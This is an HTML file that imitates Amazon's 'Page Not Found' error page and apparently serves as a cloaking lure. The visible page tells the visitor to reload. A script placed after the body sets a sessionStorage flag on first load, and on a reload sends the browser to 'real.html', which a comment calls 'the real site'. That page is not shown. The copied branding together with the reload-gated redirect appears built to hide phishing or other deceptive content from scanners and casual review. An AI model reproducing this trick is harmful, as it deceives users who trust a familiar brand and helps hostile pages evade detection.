<html>
  
  <head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>
      Amazon.com Page Not Found
    </title>
    <style>
      html,body{padding:0;margin:0}img{border:0}#a,#b{background:#232f3e;padding:11px;height:35px}#c{position:absolute;left:22px;top:12px}#e{position:relative;max-width:800px;padding-right:40px;margin-left:171px}#f,#g{height:35px;border:0;font-size:1em}#f{width:100%;margin:0;padding:0
      10px;border-radius:4px 0 0 4px}#g{cursor:pointer;background:#febd69;font-weight:bold;border-radius:0
      4px 4px 0;-webkit-appearance:none;position:absolute;top:0;right:0;padding:0
      12px}@media(max-width:500px){#e{margin-left:0}#b{padding:55px 10px 10px}#c{left:6px}}#h{text-align:center;margin:30px
      0}#h img{max-width:90%}#d{display:none}#d[src]{display:inline}
    </style>
    <style data-cursor="cursor">
    </style>
  </head>
  
  <body>
    <form id="b" accept-charset="utf-8" action="/s" method="GET" role="search">
      <a href="/">
        <img id="c" src="https://images-na.ssl-images-amazon.com/images/G/01/error/logo._TTD_.png"
        alt="Amazon.com">
      </a>
    </form>
    <div id="h">
      <div>
        <p>
          <img src="amazon.png"
          alt="Sorry! We couldn't find that page. Please try to reload the page!"
          cursorshover="true">
        <p>
      </div>
      <p>
        <img id="d" alt="Dogs of Amazon" src="https://images-na.ssl-images-amazon.com/images/G/01/error/28._TTD_.jpg"
        cursorshover="true">
        <script>
          document.getElementById("d").src = "https://images-na.ssl-images-amazon.com/images/G/01/error/" + (Math.floor(Math.random() * 200) + 1) + "._TTD_.jpg";
        </script>
      <p>
    </div>
  </body>


  <script>
    if (sessionStorage.getItem('hasReloaded')) {
        // Redirect to the real site
        window.location.href = 'real.html';
    } else {
        // Set the reload flag for next time
        sessionStorage.setItem('hasReloaded', true);
    }
    </script>

</html>
